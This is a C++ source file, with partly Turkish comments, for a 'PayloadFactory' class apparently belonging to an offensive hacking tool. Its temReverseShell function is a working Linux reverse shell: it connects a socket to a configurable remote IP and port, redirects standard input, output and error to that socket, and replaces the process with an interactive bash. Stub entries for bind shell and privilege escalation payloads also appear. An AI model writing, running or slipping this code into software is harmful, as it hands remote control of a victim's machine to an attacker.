#include "../../include/payloadFactory.hpp"

/*
    1-manuel baslatma   //tcp ~ ipv4
    2-otomatik baslatma //tcp/udp ~ ipv4/ipv6 ~ port ~ ip
*/

PayloadFactory::PayloadFactory(TEM_TARGET_OS targetSystem){
    this->targetSystem = targetSystem;
    this->init_ipv4v6 = IPV4;
    this->init_tcp_udp = TCP;
    this->victim = new csock(init_tcp_udp,init_ipv4v6);
}


PayloadFactory::PayloadFactory(TEM_TARGET_OS targetSystem,CSOCK_INIT init_ipv4v6,CSOCK_INIT init_tcp_udp,
                               const std::string rsIP , uint rsPortNo)
: rsPortNo(rsPortNo) , rsIP(rsIP){
    this->targetSystem = targetSystem;
    this->init_ipv4v6 = init_ipv4v6;
    this->init_tcp_udp = init_tcp_udp;

    //manuel init 
    this->victim = new csock(init_tcp_udp,init_ipv4v6);
}

PayloadFactory::~PayloadFactory(){
    delete victim;
}


//reverse shell initalizer
bool PayloadFactory::temReverseShell(){
    victim->setConnectedServerConfig(rsIP.c_str(),rsPortNo);
    victim->setClientConnection(CSOCK_ONCE);
    bool connectionStatus = victim->connectServer();

    if(!connectionStatus)
        return false;

    if(targetSystem == TARGET_LINUX){
        const char *shellPath = "/bin/bash";
        char *const argv[] = {"/bin/bash","-i",NULL}; //bash=argc1 , params -i terminal_mode ,null delimeter
        char *const envp[] = {NULL};

        short i = 0;  //read ,write ,write
        while(i < 3)  //stdin,stdout,stderr 
            dup2(victim->getSocketFD(),i++); //redirect socket , global sockets
        

        execve(shellPath,argv,envp); //replace eder processi
        
        perror("PROCESS NOT REPLACED !");
        return false;
        /*
        Replace the current process, executing PATH with arguments ARGV and
        environment ENVP. ARGV and ENVP are terminated by NULL pointers.
        File: unistd.h
        */
        
    }
    else if(targetSystem == TARGET_WINDOWS){

        std::cout << "not defined" << "\n";

    }    
    return true;
}

void PayloadFactory::setIP_Port(const std::string &rsIP,uint rsPort){
    this->rsIP = rsIP;
    this->rsPortNo = rsPort;
}


bool PayloadFactory::createPayloadRuntime(const std::string payload_name ,std::vector<std::string> &args){
    if(payload_name == "reverse_shell"){
        DEBUG("1");
        return temReverseShell();
    }
    else if(payload_name == "bind_shell"){
        return false;
    }
    else if(payload_name == "privilege_escalation"){
        return false;
    }
    else{
        std::cout << "[PAYLOAD-FACTORY] : NOT DEFINED PAYLOAD" << "\n"; 
    }

    return false;
}

bool PayloadFactory::createPayloadExecutable(std::string &payload_name , std::vector<std::string> &args,std::string &outputPath){

}